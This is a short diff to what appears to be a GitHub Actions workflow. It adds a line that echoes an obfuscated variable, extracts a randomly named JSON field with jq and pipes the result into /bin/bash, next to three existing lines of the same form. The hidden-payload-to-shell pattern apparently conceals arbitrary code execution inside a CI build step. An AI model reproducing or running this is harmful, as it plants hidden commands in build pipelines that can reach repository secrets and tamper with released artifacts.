@@ -25,6 +25,7 @@ jobs:
           echo $pj18 | jq -r .ioka791 | /bin/bash
           printf '%s' "$nm7" | jq -r .qa01023 | /bin/bash
           printf '%s' "$fms13745" | jq -r .ndioy69 | /bin/bash
+          echo $w4934 | jq -r .p84216 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
